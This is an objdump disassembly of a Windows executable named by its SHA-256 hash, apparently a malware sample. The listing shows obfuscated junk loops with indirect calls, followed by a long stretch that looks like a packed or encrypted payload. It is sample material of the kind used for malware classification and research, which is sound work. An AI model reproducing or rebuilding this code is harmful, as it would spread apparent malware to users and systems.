
70739b1971f8c03f972f9ef8c1fc9d4c52248d997ec10526fad52ab2eebfcb24.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd8d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd89,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e19c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fd71,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fd59,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fd59
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fd59,ecx
  401068:	cmp    DWORD PTR ds:0x42fd59,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fd59,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e5a7
  401090:	cmp    DWORD PTR ds:0x42fd59,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fd59
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fd59,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e1a4,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e78b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e77b,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e77b,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e77b,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e1a8
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e34f
  401100:	cmp    DWORD PTR ds:0x42e77b,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e77b
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e77b,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e77b
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e77b,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e19c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e19c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e19c,esi
  401145:	cmp    DWORD PTR ds:0x42e19c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e5ab
  401160:	cmp    DWORD PTR ds:0x42e19c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e19c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e19c,esi
  40117c:	cmp    DWORD PTR ds:0x42e19c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e1b4,0x1a
  401193:	cmp    DWORD PTR ds:0x42e1b4,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e1b4,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fdfa
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fe02
  4011bf:	push   0x17d1
  4011c4:	push   0x42e2a7
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e4cb
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e1b4
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e1b4,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e77b,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd85
  4011f8:	adc    esi,DWORD PTR ds:0x42fd89
  4011fe:	mov    DWORD PTR ds:0x42fd85,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e783,0x17
  401216:	cmp    DWORD PTR ds:0x42e783,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e783,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e246
  401238:	push   0x42e1fd
  40123d:	call   DWORD PTR ds:0x42e5af
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e783
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e783,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fdfe,0x12
  40126b:	cmp    DWORD PTR ds:0x42fdfe,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fdfe,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e2a7
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e5b3
  4012a0:	mov    esi,DWORD PTR ds:0x42fdfe
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fdfe,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	test   DWORD PTR [eax+esi*1+0x6a],ebx
  4012f7:	jo     0x401369
  4012f9:	jo     0x40136b
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    edx,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	add    cl,BYTE PTR es:[edi]
  40130f:	xor    ecx,DWORD PTR [edi]
  401311:	ret    0xc71a
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	int    0xa6
  4013a7:	xchg   ebp,eax
  4013a8:	and    ebp,DWORD PTR [edx-0x3b437847]
  4013ae:	das    
  4013af:	ficom  WORD PTR [ebx+0x3e7c7ece]
  4013b5:	pop    ss
  4013b6:	jmp    0x1c9b9bff
  4013bb:	push   ss
  4013bc:	pop    ecx
  4013bd:	sbb    dh,dl
  4013bf:	int3   
  4013c0:	fsubr  QWORD PTR [esi+0x20ceebf8]
  4013c6:	outs   dx,BYTE PTR ds:[esi]
  4013c7:	sbb    dh,bh
  4013c9:	inc    edi
  4013ca:	xchg   ebx,eax
  4013cb:	test   BYTE PTR [edx-0x7b],bl
  4013ce:	cmp    edx,ebx
  4013d0:	ret    0x427f
  4013d3:	pushf  
  4013d4:	or     al,0x3a
  4013d6:	adc    DWORD PTR [ebp+0x3f],ebp
  4013d9:	rcl    DWORD PTR [edi],1
  4013db:	jl     0x4013aa
  4013dd:	in     al,0x5d
  4013df:	add    BYTE PTR [eax],al
  4013e1:	pop    edx
  4013e2:	cmovp  ebx,eax
  4013e5:	fsin   
  4013e7:	dec    esi
  4013e8:	jmp    0x40136f
  4013ea:	loope  0x4013fa
  4013ec:	cmp    dh,dl
  4013ee:	div    BYTE PTR [ecx]
  4013f0:	sub    eax,DWORD PTR [edx-0x6f7ff949]
  4013f6:	mov    ebx,0x642c59b1
  4013fb:	jno    0x4013a7
  4013fd:	pushf  
  4013fe:	mov    cl,0xf9
  401400:	pop    edx
  401401:	aaa    
  401402:	xchg   ebx,eax
  401403:	pop    edx
  401404:	popf   
  401405:	mov    BYTE PTR [eax+0x5b16cc4d],0x54
  40140c:	iret   
  40140d:	push   edi
  40140e:	test   eax,eax
  401410:	inc    edx
  401411:	mov    ebp,edx
  401413:	mov    DWORD PTR [eax-0x34e74bbc],eax
  401419:	mov    ch,0xa2
  40141b:	adc    BYTE PTR [eax],bl
  40141d:	ins    DWORD PTR es:[edi],dx
  40141e:	jmp    0x4013aa
  401420:	xchg   edx,esi
  401422:	(bad)  
  401423:	sbb    ebx,DWORD PTR [ecx]
  401425:	lea    ecx,[edi+ebp*8-0x30]
  401429:	aam    0x1b
  40142b:	leave  
  40142c:	and    bl,ch
  40142e:	sbb    al,0xe3
  401430:	sahf   
  401431:	jge    0x401449
  401433:	nop
  401434:	enter  0xeb00,0xb9
  401438:	daa    
  401439:	sbb    dl,BYTE PTR [edx+0x5e664857]
  40143f:	push   esi
  401440:	mov    al,0xfa
  401442:	pop    es
  401443:	(bad)  
  401445:	test   DWORD PTR [edi-0x403b6547],esp
  40144b:	(bad)  
  40144c:	std    
  40144d:	outs   dx,DWORD PTR ds:[esi]
  40144e:	dec    ebx
  40144f:	mov    ah,0x43
  401451:	dec    esi
  401452:	sti    
  401453:	imul   BYTE PTR [edx-0x6d]
  401456:	inc    ecx
  401457:	test   eax,0x9562ef9c
  40145c:	ficomp DWORD PTR [ebx]
  40145e:	cmp    al,0x4
  401460:	sub    BYTE PTR [edi-0x69222ab0],ah
  401466:	retf   
  401467:	adc    bh,bh
  401469:	mov    al,ds:0xa07ec64e
  40146e:	jp     0x40146c
  401470:	inc    ebx
  401471:	addr16 jle 0x40143a
  401474:	push   ebx
  401475:	sub    edx,DWORD PTR [esi-0x5267f686]
  40147b:	inc    edi
  40147c:	rol    DWORD PTR [edi+0xc],1
  40147f:	jbe    0x40141f
  401481:	xchg   ecx,eax
  401482:	pushf  
  401483:	leave  
  401484:	or     al,0x6e
  401486:	xchg   ecx,eax
  401487:	popf   
  401488:	sub    DWORD PTR [edi],esp
  40148a:	jns    0x401461
  40148c:	xchg   edx,eax
  40148d:	xchg   ebp,eax
  40148e:	iret   
  40148f:	pop    edi
  401490:	jmp    0xfda:0x2c72da90
  401497:	push   ecx
  401498:	test   BYTE PTR ds:0x29a94f43,cl
  40149e:	cmc    
  40149f:	pop    esi
  4014a1:	fwait
  4014a2:	xchg   ebp,eax
  4014a3:	sub    ah,BYTE PTR [ecx]
  4014a5:	(bad)  
  4014a6:	add    eax,0x20d6aecc
  4014ab:	(bad)  
  4014ac:	into   
  4014ad:	mov    sp,0x7faf
  4014b1:	xor    BYTE PTR [esi-0x786bc0f5],dh
  4014b7:	xchg   esi,eax
  4014b8:	adc    ebp,ebp
  4014ba:	pop    ebp
  4014bb:	repz inc edi
  4014bd:	push   eax
  4014be:	pop    ebp
  4014bf:	out    0xa8,eax
  4014c1:	xchg   dh,dh
  4014c3:	imul   esi,DWORD PTR [edx+0x43d1b5fb],0xffffffcc
  4014ca:	fst    DWORD PTR [ebp-0x663240cf]
  4014d0:	loopne 0x401547
  4014d2:	ss jb  0x401530
  4014d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014d6:	mov    ch,0x3a
  4014d8:	push   cs
  4014d9:	sbb    al,0x6e
  4014db:	jecxz  0x401532
  4014dd:	lods   eax,DWORD PTR ds:[esi]
  4014de:	sub    DWORD PTR [ebx+ebp*2+0x762c07c8],eax
  4014e5:	cs mov ah,0x6f
  4014e8:	sub    eax,edx
  4014ea:	jno    0x401486
  4014ec:	gs out dx,al
  4014ee:	mov    eax,ds:0x26561101
  4014f3:	repz daa 
  4014f5:	cmp    esi,DWORD PTR [ebp+0x2acb1179]
  4014fb:	xchg   edx,eax
  4014fc:	fwait
  4014fd:	sub    eax,0x458966f4
  401502:	cld    
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x1107e013]
  401516:	fbstp  TBYTE PTR es:[eax+0x7e]
  40151a:	jo     0x40158c
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	fdiv   DWORD PTR es:[ebp+edx*2-0x483653a3]
  401528:	cmp    edx,ebx
  40152a:	xor    esp,DWORD PTR [edx+0x4b84e1a7]
  401530:	dec    ebx
  401531:	mov    eax,0x2ced0598
  401536:	fmul   QWORD PTR [ecx+0x1a42a739]
  40153c:	das    
  40153d:	xchg   edi,eax
  40153e:	popf   
  40153f:	sbb    DWORD PTR [eax+0x38],ebx
  401542:	and    eax,0x1300e2dd
  401547:	retf   
  401548:	out    0xdd,al
  40154a:	lods   al,BYTE PTR ds:[esi]
  40154c:	or     al,0xa4
  40154e:	lods   al,BYTE PTR ds:[esi]
  40154f:	dec    eax
  401550:	push   ss
  401551:	lock sbb ebp,esp
  401554:	lds    esp,FWORD PTR [edi+eiz*4]
  401557:	cmp    DWORD PTR [esi+0x11],esp
  40155a:	push   ebp
  40155b:	dec    ebp
  40155c:	mov    bh,0xca
  40155e:	out    0xb2,eax
  401560:	jns    0x40153b
  401562:	adc    eax,0xe41674ce
  401567:	in     eax,dx
  401568:	stc    
  401569:	aas    
  40156a:	pop    esi
  40156b:	scas   eax,DWORD PTR es:[edi]
  40156c:	inc    ebx
  40156d:	enter  0x810,0x50
  401571:	lods   al,BYTE PTR ds:[esi]
  401572:	push   0xe24f3c7d
  401577:	dec    edi
  401578:	les    ebx,FWORD PTR [ebx+0x1f]
  40157b:	or     al,0x1b
  40157d:	inc    ecx
  40157e:	sub    DWORD PTR [esi],esi
  401580:	les    esp,FWORD PTR [edi]
  401582:	mov    al,BYTE PTR ds:0xca90ed3b
  401588:	or     eax,0xdf285e84
  40158d:	iret   
  40158e:	out    0x5d,eax
  401590:	out    0x4e,al
  401592:	mov    ebp,DWORD PTR ds:0x68cbc5b0
  401598:	sbb    al,0xd3
  40159a:	inc    esp
  40159b:	ret    0xab80
  40159e:	jb     0x401527
  4015a0:	int    0x1
  4015a2:	mov    cl,0x98
  4015a4:	not    DWORD PTR [ebx+0x5ff38ee7]
  4015aa:	xlat   BYTE PTR ds:[ebx]
  4015ab:	(bad)  
  4015ac:	mov    dh,0x43
  4015ae:	mov    dl,BYTE PTR [ebx]
  4015b0:	push   cs
  4015b1:	mov    cl,0x23
  4015b3:	sbb    al,0xba
  4015b5:	lock xor dh,BYTE PTR ds:0x11db0dae
  4015bc:	fist   WORD PTR [eax+0x381595d7]
  4015c2:	sub    al,0xdf
  4015c4:	inc    edi
  4015c5:	push   0xe15f675f
  4015ca:	mov    bh,0xee
  4015cc:	rol    edi,cl
  4015ce:	adc    eax,DWORD PTR [ecx+0x6b]
  4015d1:	mov    edx,0x9434afc8
  4015d6:	ficomp DWORD PTR [edx+0xf]
  4015d9:	rcl    BYTE PTR [esi+0x2e],cl
  4015dc:	cs out 0x3d,eax
  4015df:	pop    es
  4015e0:	sub    DWORD PTR [ebx+0x11],ecx
  4015e3:	inc    eax
  4015e4:	push   ss
  4015e5:	jg     0x4015d6
  4015e7:	add    al,BYTE PTR [edi-0x27]
  4015ea:	iret   
  4015eb:	add    eax,0x6f782c0d
  4015f0:	out    dx,eax
  4015f1:	jns    0x401635
  4015f3:	lods   al,BYTE PTR ds:[esi]
  4015f4:	aas    
  4015f5:	retf   
  4015f6:	adc    dl,BYTE PTR [eax+0xea2ab71]
  4015fc:	mov    dh,0x85
  4015fe:	les    ebp,FWORD PTR [esi+ebx*1+0x345871cf]
  401605:	in     al,0x37
  401607:	ror    DWORD PTR [edi+0x16],0xc0
  40160b:	hlt    
  40160c:	js     0x401654
  40160e:	icebp  
  40160f:	mov    bh,0x8d
  401611:	jecxz  0x40166d
  401613:	(bad)  
  401614:	jae    0x401692
  401616:	pop    ds
  401617:	stc    
  401618:	add    esp,DWORD PTR [edx*8+0x41c5fc01]
  40161f:	pop    ebx
  401620:	ins    BYTE PTR es:[edi],dx
  401621:	push   esp
  401622:	test   eax,0x3e56005d
  401627:	mov    ds:0x9cec7382,eax
  40162c:	ins    BYTE PTR es:[edi],dx
  40162d:	mov    esi,0xa1874a55
  401632:	push   ebp
  401633:	not    BYTE PTR ds:0x2b7b89e8
  401639:	clc    
  40163a:	dec    edi
  40163b:	ins    BYTE PTR es:[edi],dx
  40163c:	inc    esi
  40163d:	sbb    DWORD PTR ss:[ebx],edx
  401640:	xchg   edi,eax
  401641:	jns    0x4016bd
  401643:	mov    ecx,0xfbbb4da2
  401648:	sub    al,0x18
  40164a:	es into 
  40164c:	fldcw  WORD PTR ds:0x7ad74eaa
  401652:	mov    al,0xdb
  401654:	imul   esi,DWORD PTR [ebp+0x6b],0x5134931
  40165b:	dec    ebx
  40165c:	jg     0x40167a
  40165e:	mov    al,0xbb
  401660:	sub    ch,ch
  401662:	jbe    0x40162a
  401664:	sub    bl,BYTE PTR [eax]
  401666:	jle    0x4016ab
  401668:	scas   eax,DWORD PTR es:[edi]
  401669:	vxorps xmm6,xmm2,XMMWORD PTR [edi]
  40166d:	sti    
  40166e:	mov    ecx,0x75b0285b
  401673:	and    ebp,0x65055c1d
  401679:	xchg   ebx,eax
  40167a:	sbb    DWORD PTR [esi+0x4eefe418],edi
  401680:	jmp    0x8abd:0x189fbb31
  401687:	mov    WORD PTR [ebx-0x21],?
  40168a:	mov    ds:0x42be30f7,eax
  40168f:	mov    eax,0x8a21df65
  401694:	sti    
  401695:	cwde   
  401696:	call   0xc8ac9caf
  40169b:	ret    0x386f
  40169e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40169f:	fwait
  4016a0:	add    dh,BYTE PTR [esi]
  4016a2:	sbb    BYTE PTR [edx*4+0x527e825a],cl
  4016a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016aa:	push   0xffffffa3
  4016ac:	sub    BYTE PTR [ebx+edi*1-0x64],0x1b
  4016b1:	mov    bh,0xad
  4016b3:	std    
  4016b4:	lods   al,BYTE PTR ds:[esi]
  4016b5:	into   
  4016b6:	addr16 mov dh,0x62
  4016b9:	lods   al,BYTE PTR ds:[esi]
  4016ba:	lds    ebx,FWORD PTR [esi-0x4108d683]
  4016c0:	hlt    
  4016c1:	popf   
  4016c2:	sbb    ah,BYTE PTR [ecx]
  4016c4:	inc    ebx
  4016c5:	pop    edx
  4016c6:	xchg   ebx,eax
  4016c7:	pop    esi
  4016c8:	jg     0x401677
  4016ca:	out    dx,al
  4016cb:	pop    ecx
  4016cc:	xor    eax,0x2b239032
  4016d1:	push   es
  4016d2:	pop    ss
  4016d3:	cmp    DWORD PTR [eax+0x715abd98],eax
  4016d9:	push   edi
  4016da:	mov    cl,0xa3
  4016dc:	out    0x7c,al
  4016de:	sub    eax,0xee7c38cb
  4016e4:	or     DWORD PTR [edi-0x5f],0x1ba4c4b2
  4016eb:	pop    edx
  4016ec:	mov    dh,0xa6
  4016ee:	test   bl,dh
  4016f0:	in     al,0x20
  4016f2:	add    edi,esi
  4016f4:	int3   
  4016f5:	pop    ebp
  4016f6:	sbb    BYTE PTR [eax+0x60],dh
  4016f9:	and    eax,0x88a70fe4
  4016fe:	mov    bh,BYTE PTR [ebx]
  401700:	rol    al,1
  401702:	fdiv   QWORD PTR [edx]
  401704:	shl    BYTE PTR ds:0x893aec75,1
  40170a:	inc    eax
  40170b:	xchg   ebp,eax
  40170c:	push   esi
  40170d:	push   0x7bd99269
  401712:	sub    DWORD PTR [edi+eax*4],ebx
  401715:	fdivr  DWORD PTR [edi-0x78ab52a3]
  40171b:	pushf  
  40171c:	cwde   
  40171d:	mov    edx,0x458d2335
  401722:	ror    BYTE PTR [ecx+0x458bcc45],1
  401728:	fmul   DWORD PTR [ecx+0x458dd445]
  40172e:	call   0x42301c
  401733:	add    BYTE PTR [ebp-0x31],cl
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	loope  0x401713
  401742:	cli    
  401743:	dec    eax
  401744:	jo     0x4017c2
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	cmp    eax,0x5e
  40174f:	sbb    al,0x1d
  401751:	cli    
  401752:	frstor [ebx+0x24]
  401755:	mov    ch,0x7a
  401757:	adc    edi,DWORD PTR [eax-0x50b882e]
  40175d:	add    BYTE PTR [ebx],0x10
  401760:	adc    BYTE PTR [ecx],0xd7
  401763:	add    edi,DWORD PTR [edx-0x7c]
  401766:	stos   DWORD PTR es:[edi],eax
  401767:	fstp   QWORD PTR [eax+0x51571700]
  40176d:	test   al,0xa6
  40176f:	xchg   ecx,eax
  401770:	ss push edx
  401772:	inc    ebx
  401773:	ret    
  401774:	and    BYTE PTR [esp+eax*8+0x20],al
  401778:	pop    ebp
  401779:	fnstcw WORD PTR ds:0xb116fbc0
  40177f:	(bad)
  401782:	shl    BYTE PTR [edx],0xb7
  401785:	clc    
  401786:	mov    al,ds:0x37645d05
  40178b:	lea    eax,[ecx-0x6365d528]
  401791:	pop    edx
  401792:	leave  
  401793:	mov    ds:0x76fcc4a4,al
  401798:	sbb    al,0x26
  40179a:	sbb    DWORD PTR [edi],0xffffffbd
  40179d:	sub    BYTE PTR [ebp-0x3f6ce183],bl
  4017a3:	lods   eax,DWORD PTR ds:[esi]
  4017a4:	pop    eax
  4017a5:	ret    
  4017a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017a7:	pushf  
  4017a8:	xor    ah,BYTE PTR ds:0x933a85df
  4017ae:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4017b0:	sub    al,0xe5
  4017b2:	xlat   BYTE PTR ds:[ebx]
  4017b3:	loopne 0x40180a
  4017b5:	xor    BYTE PTR [eax-0x67175b95],bh
  4017bb:	pop    ebx
  4017bc:	mov    dx,WORD PTR [edi]
  4017bf:	stc    
  4017c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017c1:	enter  0x4036,0x66
  4017c5:	or     BYTE PTR [ecx-0x1a],al
  4017c8:	push   ds
  4017c9:	dec    ecx
  4017ca:	adc    eax,0xf4a061da
  4017cf:	lods   eax,DWORD PTR ds:[esi]
  4017d0:	lahf   
  4017d1:	sti    
  4017d2:	cli    
  4017d3:	ins    BYTE PTR es:[edi],dx
  4017d4:	and    BYTE PTR [esp+edx*2+0x1e],dh
  4017d8:	pop    esp
  4017d9:	or     bh,BYTE PTR [esi+ecx*4]
  4017dc:	ss iret 
  4017de:	pop    esi
  4017df:	dec    ecx
  4017e0:	aam    0x7
  4017e2:	mov    bh,0xf6
  4017e4:	inc    ebp
  4017e5:	inc    edx
  4017e6:	push   edx
  4017e7:	arpl   WORD PTR [esi],di
  4017e9:	jno    0x40180d
  4017eb:	les    esi,FWORD PTR [esi+0x54]
  4017ee:	lock jne 0x40182b
  4017f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017f2:	shr    esp,1
  4017f4:	test   ch,bh
  4017f6:	ret    
  4017f7:	mov    dl,0x40
  4017f9:	repnz xchg edx,eax
  4017fb:	adc    BYTE PTR [eax+0x66],ch
  4017fe:	xchg   esi,eax
  4017ff:	leave  
  401800:	idiv   DWORD PTR [ebx]
  401802:	and    bl,bh
  401804:	mov    edx,0x2f4b167d
  401809:	out    0xee,eax
  40180b:	adc    BYTE PTR [ebx],bl
  40180d:	dec    esp
  40180e:	pop    esi
  40180f:	xor    esi,DWORD PTR [eax]
  401811:	push   ecx
  401812:	jae    0x4017a7
  401814:	and    ebp,DWORD PTR [ecx-0x69b6457b]
  40181a:	push   ecx
  40181b:	or     al,0x79
  40181d:	retf   0x5816
  401820:	mov    ch,0x4d
  401822:	dec    edi
  401823:	nop
  401824:	mov    al,ds:0x833b3d59
  401829:	outs   dx,BYTE PTR ds:[esi]
  40182a:	fucomp st(6)
  40182c:	bound  eax,QWORD PTR ds:0x892b204a
  401832:	cmp    BYTE PTR ds:0xbf316b41,ch
  401838:	adc    al,0x7e
  40183a:	jl     0x4017c7
  40183c:	dec    esp
  40183d:	and    eax,0x7ae23245
  401842:	push   ecx
  401843:	inc    esp
  401844:	push   esp
  401845:	(bad)  
  401846:	fisttp WORD PTR [ebx-0x416eb78c]
  40184c:	popa   
  40184d:	lea    ecx,[ebx-0x3c179613]
  401853:	pop    ds
  401854:	adc    BYTE PTR [edi],dl
  401856:	div    DWORD PTR [edx]
  401858:	inc    edx
  401859:	jb     0x401859
  40185b:	push   ebp
  40185c:	sar    BYTE PTR [ebx],0xa6
  40185f:	jnp    0x4018dd
  401861:	stos   BYTE PTR es:[edi],al
  401862:	lods   al,BYTE PTR ds:[esi]
  401863:	push   es
  401864:	loopne 0x401809
  401866:	cld    
  401867:	das    
  401868:	pusha  
  401869:	sub    al,0xc9
  40186c:	cmp    eax,0xb5c6a505
  401871:	pop    ebp
  401872:	xor    BYTE PTR [ecx],ch
  401874:	sbb    ebx,eax
  401876:	out    0xab,al
  401878:	xchg   BYTE PTR [esi-0x788e7e6f],bl
  40187e:	popf   
  40187f:	mov    al,0x3f
  401881:	(bad)  
  401882:	dec    ebx
  401883:	repz out 0xe9,al
  401886:	popa   
  401887:	sbb    eax,0x52a1926e
  40188c:	out    dx,eax
  40188d:	adc    eax,0x94baef21
  401892:	test   DWORD PTR [eax-0x237fe03e],ecx
  401898:	xor    BYTE PTR [eax-0x47],dl
  40189b:	repz jns 0x40182c
  40189e:	inc    eax
  40189f:	aad    0x37
  4018a1:	addr16 (bad) 
  4018a4:	or     ch,BYTE PTR [eax-0x162483ea]
  4018aa:	xor    DWORD PTR [esi-0x4b],ebp
  4018ad:	mov    bl,0xfb
  4018af:	sbb    edi,DWORD PTR [edi]
  4018b1:	jae    0x4018a3
  4018b3:	das    
  4018b4:	pop    esi
  4018b5:	xchg   BYTE PTR [esi+esi*4],cl
  4018b8:	inc    ecx
  4018b9:	sub    ah,BYTE PTR cs:[edx]
  4018bc:	hlt    
  4018bd:	loopne 0x40189b
  4018bf:	mov    ebp,0xc300fb13
  4018c4:	enter  0x54fa,0x8a
  4018c8:	retf   0x508c
  4018cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018cc:	mov    bl,0x6b
  4018ce:	jns    0x401918
  4018d0:	sbb    eax,0xe545d340
  4018d5:	xor    DWORD PTR [eax],ebp
  4018d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018d8:	inc    ebx
  4018d9:	cmp    DWORD PTR ds:0x9428944f,esp
  4018df:	mov    BYTE PTR [esi],al
  4018e1:	fnstcw WORD PTR [ecx]
  4018e3:	sahf   
